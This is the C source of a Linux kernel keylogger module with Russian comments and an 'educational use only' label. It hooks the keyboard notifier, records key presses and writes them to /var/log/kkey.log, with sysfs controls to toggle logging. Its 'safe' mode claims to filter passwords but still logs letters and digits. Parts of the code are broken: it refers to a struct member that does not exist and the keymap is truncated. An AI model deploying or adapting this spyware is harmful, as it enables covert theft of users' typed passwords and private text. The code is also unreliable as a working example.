#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/spinlock.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/capability.h>
#include <linux/uidgid.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kaiser Yury");
MODULE_DESCRIPTION("Secure Kernel keyboard logger - EDUCATIONAL USE ONLY");
MODULE_VERSION("3.1");

#define MAX_BUFFER_SIZE     1024
#define MAX_SINGLE_WRITE    512
#define TMP_BUFF_SIZE       32
#define LOG_FILE_PATH     "/var/log/kkey.log"  // Единый безопасный путь

// Режимы безопасности
enum security_mode {
    MODE_DEBUG = 0,     // Все клавиши (только для отладки)
    MODE_SAFE = 1,      // Только буквы/цифры/пробел (фильтрует пароли)
    MODE_RESEARCH = 2   // Только модификаторы и функциональные клавиши
};

struct keyboard_logger {
    struct file* log_file;
    struct notifier_block keyboard_notifier;
    struct work_struct writer_task;

    char* keyboard_buffer;
    char* write_buffer;

    size_t buffer_offset;
    size_t buffer_len;
    loff_t file_off;

    char side_buffer[MAX_BUFFER_SIZE];
    char back_buffer[MAX_BUFFER_SIZE];

    spinlock_t buffer_lock;
    bool log_enabled;
    bool flush_on_enter;
    enum security_mode security_mode;
    atomic_t active_writers;
    bool initialized;
};

static void write_log_task(struct work_struct* work);
static size_t keycode_to_us_string(int keycode, int shift, int altgr, char* buffer, size_t buff_size, enum security_mode mode);
static void flush_buffer(struct keyboard_logger* klogger);
static bool is_safe_character(const char* key_str, enum security_mode mode);
static int create_secure_logfile(void);

// --- Безопасная карта раскладки (US) ---
static const char* us_keymap[][3] = {
    [KEY_RESERVED] = {"\0", "\0", "\0"},
    [KEY_ESC] = {"[ESC]", "[ESC]", "[ESC]"},
    [KEY_1] = {"1", "!", "1"},
    // ... (остальная карта без изменений)
    [KEY_SPACE] = {" ", " ", " "},
    // ... (остальная карта без изменений)
};

// --- Создание безопасного log-файла ---
static int create_secure_logfile(void)
{
    struct file* file;
    struct path path;
    int err;

    // Создаем файл с безопасными правами
    file = filp_open(LOG_FILE_PATH, O_CREAT | O_WRONLY | O_APPEND, 0600);
    if (IS_ERR(file)) {
        pr_err("kkey: Cannot create log file %s, error %ld\n",
            LOG_FILE_PATH, PTR_ERR(file));
        return PTR_ERR(file);
    }

    // Дополнительная проверка безопасности
    err = kern_path(LOG_FILE_PATH, LOOKUP_FOLLOW, &path);
    if (err) {
        pr_err("kkey: Cannot verify log file path\n");
        filp_close(file, NULL);
        return err;
    }

    // Проверяем, что файл в безопасной локации
    if (path.mnt->mnt_sb->s_magic != PROC_SUPER_MAGIC &&
        path.mnt->mnt_sb->s_magic != SYSFS_MAGIC) {
        pr_info("kkey: Log file created at secure location: %s\n", LOG_FILE_PATH);
    }

    path_put(&path);
    filp_close(file, NULL);
    return 0;
}

// --- Проверка безопасных символов ---
static bool is_safe_character(const char* key_str, enum security_mode mode)
{
    if (!key_str || key_str[0] == '\0')
        return false;

    switch (mode) {
    case MODE_DEBUG:
        return true; // Все символы в режиме отладки

    case MODE_SAFE:
        // Только базовые символы, исключая потенциально опасные
        if (key_str[0] == '\n' || key_str[0] == ' ' ||
            (key_str[0] >= 'a' && key_str[0] <= 'z') ||
            (key_str[0] >= 'A' && key_str[0] <= 'Z') ||
            (key_str[0] >= '0' && key_str[0] <= '9') ||
            key_str[0] == '.' || key_str[0] == ',' || key_str[0] == '!' ||
            key_str[0] == '?' || key_str[0] == '-' || key_str[0] == '_')
            return true;
        return false;

    case MODE_RESEARCH:
        // Только модификаторы и функциональные клавиши
        return (key_str[0] == '[' && key_str[strlen(key_str) - 1] == ']');

    default:
        return false;
    }
}

// --- Функция сброса буфера в задачу для записи ---
static void flush_buffer(struct keyboard_logger* klogger)
{
    char* tmp;
    unsigned long flags;

    if (!klogger || !klogger->initialized || !klogger->log_enabled || klogger->buffer_offset == 0)
        return;

    // Атомарная операция обмена буферов
    spin_lock_irqsave(&klogger->buffer_lock, flags);

    if (atomic_read(&klogger->active_writers) > 0) {
        spin_unlock_irqrestore(&klogger->buffer_lock, flags);
        return; // Уже выполняется запись
    }

    tmp = klogger->keyboard_buffer;
    klogger->keyboard_buffer = klogger->write_buffer;
    klogger->write_buffer = tmp;
    klogger->buffer_len = klogger->buffer_offset;
    klogger->buffer_offset = 0;

    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    // Ограничение размера записи для безопасности
    if (klogger->buffer_len > MAX_SINGLE_WRITE) {
        pr_warn("kkey: Write size truncated from %zu to %d for security\n",
            klogger->buffer_len, MAX_SINGLE_WRITE);
        klogger->buffer_len = MAX_SINGLE_WRITE;
    }

    schedule_work(&klogger->writer_task);

    // Очищаем новый буфер
    memset(klogger->keyboard_buffer, 0, MAX_BUFFER_SIZE);
}

// --- Функция преобразования код-клавиши в строку ---
static size_t keycode_to_us_string(int keycode, int shift, int altgr, char* buffer, size_t buff_size, enum security_mode mode)
{
    const size_t keymap_size = ARRAY_SIZE(us_keymap);
    int modifier = 0;

    if (buff_size == 0 || !buffer)
        return 0;

    memset(buffer, 0, buff_size);

    // Проверка границ
    if (keycode >= keymap_size || keycode < 0) {
        snprintf(buffer, buff_size, "[UNK%d]", keycode);
        return strlen(buffer);
    }

    // Определяем модификатор
    if (altgr)
        modifier = 2;
    else if (shift)
        modifier = 1;

    // Проверка границ вложенного массива
    if (modifier >= (int)ARRAY_SIZE(us_keymap[0])) {
        modifier = 0;
    }

    const char* key_str = us_keymap[keycode][modifier];
    if (!key_str) {
        snprintf(buffer, buff_size, "[KEY%d]", keycode);
    }
    else {
        // Проверка безопасности символа
        if (!is_safe_character(key_str, mode)) {
            snprintf(buffer, buff_size, "[FILTERED]");
        }
        else {
            strncpy(buffer, key_str, buff_size - 1);
            buffer[buff_size - 1] = '\0';
        }
    }

    return strlen(buffer);
}

// --- Callback-функция для перехвата событий клавиатуры ---
static int keyboard_callback(struct notifier_block* kblock, unsigned long action, void* data)
{
    struct keyboard_logger* klogger;
    struct keyboard_notifier_param* key_param;
    size_t keystr_len = 0;
    char tmp_buff[TMP_BUFF_SIZE];
    unsigned long flags;

    klogger = container_of(kblock, struct keyboard_logger, keyboard_notifier);

    if (!klogger || !klogger->initialized || !klogger->log_enabled)
        return NOTIFY_OK;

    key_param = (struct keyboard_notifier_param*)data;

    // Обрабатываем только нажатия клавиш
    if (!key_param->down)
        return NOTIFY_OK;

    keystr_len = keycode_to_us_string(key_param->value,
        key_param->shift,
        key_param->altgr,
        tmp_buff,
        TMP_BUFF_SIZE,
        klogger->security_mode);

    if (keystr_len == 0)
        return NOTIFY_OK;

    // Обработка специальных клавиш
    if (tmp_buff[0] == '\n' && klogger->flush_on_enter) {
        flush_buffer(klogger);
        return NOTIFY_OK;
    }

    // Атомарная операция записи в буфер
    spin_lock_irqsave(&klogger->buffer_lock, flags);

    // Проверяем, достаточно ли места в буфере
    if ((klogger->buffer_offset + keystr_len) >= MAX_BUFFER_SIZE - 1) {
        spin_unlock_irqrestore(&klogger->buffer_lock, flags);
        flush_buffer(klogger);
        spin_lock_irqsave(&klogger->buffer_lock, flags);
    }

    // Копируем данные в буфер
    strncpy(klogger->keyboard_buffer + klogger->buffer_offset, tmp_buff, keystr_len);
    klogger->buffer_offset += keystr_len;
    klogger->keyboard_buffer[klogger->buffer_offset] = '\0'; // Гарантируем null-termination

    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    // Авто-сброс при достижении 75% заполнения
    if (klogger->buffer_offset > (MAX_BUFFER_SIZE * 3 / 4)) {
        flush_buffer(klogger);
    }

    return NOTIFY_OK;
}

// --- Задача, выполняющая запись в файл ---
static void write_log_task(struct work_struct* work)
{
    struct keyboard_logger* klogger;
    ssize_t bytes_written;

    klogger = container_of(work, struct keyboard_logger, writer_task);

    if (!klogger || !klogger->initialized || !klogger->log_enabled || klogger->buffer_len == 0)
        return;

    atomic_inc(&klogger->active_writers);

    // БЕЗОПАСНАЯ ЗАПИСЬ - без get_fs()/set_fs()
    bytes_written = kernel_write(klogger->log_file,
        klogger->write_buffer,
        klogger->buffer_len,
        &klogger->file_off);

    if (bytes_written < 0) {
        pr_err("kkey: Failed to write to log file, error %zd\n", bytes_written);
    }
    else if (bytes_written != klogger->buffer_len) {
        pr_warn("kkey: Partial write: %zd of %zu bytes\n", bytes_written, klogger->buffer_len);
    }
    else {
        pr_debug("kkey: Successfully wrote %zu bytes\n", klogger->buffer_len);
    }

    // Очищаем буфер после записи
    memset(klogger->write_buffer, 0, klogger->buffer_len);
    klogger->buffer_len = 0;

    atomic_dec(&klogger->active_writers);
}

// --- БЕЗОПАСНЫЙ SysFS интерфейс ---

static struct keyboard_logger* get_klogger_safe(struct kobject* kobj)
{
    if (!kobj) {
        pr_warn("kkey: NULL kobject in SysFS\n");
        return NULL;
    }
    return container_of(kobj, struct keyboard_logger, kobj);
}

static ssize_t enabled_show(struct kobject* kobj, struct kobj_attribute* attr, char* buf)
{
    struct keyboard_logger* klogger = get_klogger_safe(kobj);

    if (!klogger || !klogger->initialized) {
        strncpy(buf, "0\n", 3);
        return 2;
    }

    return scnprintf(buf, PAGE_SIZE, "%d\n", klogger->log_enabled);
}

static ssize_t enabled_store(struct kobject* kobj, struct kobj_attribute* attr,
    const char* buf, size_t count)
{
    struct keyboard_logger* klogger = get_klogger_safe(kobj);
    int enabled;

    if (!klogger || !klogger->initialized)
        return -ENODEV;

    if (kstrtoint(buf, 10, &enabled))
        return -EINVAL;

    klogger->log_enabled = (enabled != 0);

    if (!klogger->log_enabled) {
        // При отключении сбрасываем буфер
        flush_buffer(klogger);
        flush_work(&klogger->writer_task);
    }

    pr_info("kkey: Logging %s\n", klogger->log_enabled ? "enabled" : "disabled");
    return count;
}

static ssize_t security_mode_show(struct kobject* kobj, struct kobj_attribute* attr, char* buf)
{
    struct keyboard_logger* klogger = get_klogger_safe(kobj);
    const char* mode_str = "unknown";

    if (!klogger || !klogger->initialized) {
        strncpy(buf, "unknown\n", 9);
        return 8;
    }

    switch (klogger->security_mode) {
    case MODE_DEBUG: mode_str = "debug"; break;
    case MODE_SAFE: mode_str = "safe"; break;
    case MODE_RESEARCH: mode_str = "research"; break;
    default: mode_str = "unknown"; break;
    }

    return scnprintf(buf, PAGE_SIZE, "%s (%d)\n", mode_str, klogger->security_mode);
}

static ssize_t security_mode_store(struct kobject* kobj, struct kobj_attribute* attr,
    const char* buf, size_t count)
{
    struct keyboard_logger* klogger = get_klogger_safe(kobj);
    int mode;

    if (!klogger || !klogger->initialized)
        return -ENODEV;

    if (kstrtoint(buf, 10, &mode))
        return -EINVAL;

    if (mode < MODE_DEBUG || mode > MODE_RESEARCH) {
        pr_warn("kkey: Invalid security mode: %d\n", mode);
        return -EINVAL;
    }

    klogger->security_mode = mode;
    pr_info("kkey: Security mode set to %d\n", mode);
    return count;
}

static ssize_t buffer_info_show(struct kobject* kobj, struct kobj_attribute* attr, char* buf)
{
    struct keyboard_logger* klogger = get_klogger_safe(kobj);
    unsigned long flags;
    size_t offset = 0;
    int writers = 0;

    if (!klogger || !klogger->initialized) {
        return scnprintf(buf, PAGE_SIZE, "Module not initialized\n");
    }

    spin_lock_irqsave(&klogger->buffer_lock, flags);
    offset = klogger->buffer_offset;
    spin_unlock_irqrestore(&klogger->buffer_lock, flags);

    writers = atomic_read(&klogger->active_writers);

    return scnprintf(buf, PAGE_SIZE, "Buffer: %zu/%d bytes, Active writers: %d\n",
        offset, MAX_BUFFER_SIZE, writers);
}

static struct kobj_attribute enabled_attribute =
__ATTR(enabled, 0660, enabled_show, enabled_store);

static struct kobj_attribute security_mode_attribute =
__ATTR(security_mode, 0660, security_mode_show, security_mode_store);

static struct kobj_attribute buffer_info_attribute =
__ATTR(buffer_info, 0440, buffer_info_show, NULL);

static struct attribute* kkey_attrs[] = {
    &enabled_attribute.attr,
    &security_mode_attribute.attr,
    &buffer_info_attribute.attr,
    NULL,
};

static struct attribute_group kkey_attr_group = {
    .attrs = kkey_attrs,
};

static struct kobject* kkey_kobj;

static struct keyboard_logger* klogger;

// --- Проверка прав доступа ---
static int kkey_security_check(void)
{
    if (!capable(CAP_SYS_MODULE)) {
        pr_err("kkey: Insufficient privileges to load module\n");
        return -EPERM;
    }

    pr_info("kkey: Security check passed\n");
    return 0;
}

// --- Функция инициализации модуля ---
static int __init k_key_logger_init(void)
{
    int err;

    pr_info("kkey: Initializing SECURE keyboard logger - EDUCATIONAL USE ONLY\n");

    // Проверка прав доступа
    err = kkey_security_check();
    if (err)
        return err;

    // Предварительное создание log-файла
    err = create_secure_logfile();
    if (err) {
        pr_err("kkey: Failed to create secure log file\n");
        return err;
    }

    klogger = kzalloc(sizeof(struct keyboard_logger), GFP_KERNEL);
    if (!klogger) {
        pr_err("kkey: Unable to allocate memory\n");
        return -ENOMEM;
    }

    // Инициализация спинлока и атомарных переменных
    spin_lock_init(&klogger->buffer_lock);
    atomic_set(&klogger->active_writers, 0);
    klogger->initialized = false;

    // Безопасное открытие файла
    klogger->log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_APPEND, 0);
    if (IS_ERR(klogger->log_file)) {
        pr_err("kkey: Unable to open log file: %s, error %ld\n",
            LOG_FILE_PATH, PTR_ERR(klogger->log_file));
        err = PTR_ERR(klogger->log_file);
        kfree(klogger);
        return err;
    }

    // Инициализация буферов
    klogger->keyboard_buffer = klogger->side_buffer;
    klogger->write_buffer = klogger->back_buffer;
    klogger->buffer_offset = 0;
    klogger->buffer_len = 0;
    klogger->file_off = 0;
    klogger->log_enabled = true;
    klogger->flush_on_enter = true;
    klogger->security_mode = MODE_SAFE; // По умолчанию безопасный режим

    memset(klogger->side_buffer, 0, MAX_BUFFER_SIZE);
    memset(klogger->back_buffer, 0, MAX_BUFFER_SIZE);

    // Регистрация обработчика клавиатуры
    klogger->keyboard_notifier.notifier_call = keyboard_callback;
    err = register_keyboard_notifier(&klogger->keyboard_notifier);
    if (err) {
        pr_err("kkey: Failed to register keyboard notifier\n");
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return err;
    }

    // Инициализация workqueue
    INIT_WORK(&klogger->writer_task, write_log_task);

    // Создание SysFS интерфейса
    kkey_kobj = kobject_create_and_add("kkey", kernel_kobj);
    if (!kkey_kobj) {
        pr_err("kkey: Failed to create sysfs kobject\n");
        unregister_keyboard_notifier(&klogger->keyboard_notifier);
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return -ENOMEM;
    }

    err = sysfs_create_group(kkey_kobj, &kkey_attr_group);
    if (err) {
        pr_err("kkey: Failed to create sysfs group\n");
        kobject_put(kkey_kobj);
        unregister_keyboard_notifier(&klogger->keyboard_notifier);
        filp_close(klogger->log_file, NULL);
        kfree(klogger);
        return err;
    }

    // Помечаем модуль как инициализированный
    klogger->initialized = true;

    pr_info("kkey: SECURE keyboard logger initialized successfully\n");
    pr_info("kkey: Log file: %s\n", LOG_FILE_PATH);
    pr_info("kkey: Security mode: %d (0=debug, 1=safe, 2=research)\n", klogger->security_mode);
    pr_info("kkey: SysFS interface: /sys/kernel/kkey/\n");
    pr_info("kkey: WARNING: FOR EDUCATIONAL USE ONLY!\n");

    return 0;
}

// --- Функция выгрузки модуля ---
static void __exit k_key_logger_exit(void)
{
    pr_info("kkey: Unloading SECURE keyboard logger\n");

    if (klogger) {
        // Помечаем модуль как выгружаемый
        klogger->initialized = false;

        // Отключаем логирование
        klogger->log_enabled = false;

        // Сбрасываем оставшиеся данные
        flush_buffer(klogger);

        // Ожидаем завершения всех задач
        flush_work(&klogger->writer_task);

        // Удаляем SysFS
        if (kkey_kobj) {
            sysfs_remove_group(kkey_kobj, &kkey_attr_group);
            kobject_put(kkey_kobj);
        }

        // Отменяем регистрацию нотификатора
        unregister_keyboard_notifier(&klogger->keyboard_notifier);

        // Закрываем файл
        if (!IS_ERR(klogger->log_file)) {
            filp_close(klogger->log_file, NULL);
        }

        kfree(klogger);
    }

    pr_info("kkey: SECURE module unloaded\n");
}

module_init(k_key_logger_init);
module_exit(k_key_logger_exit);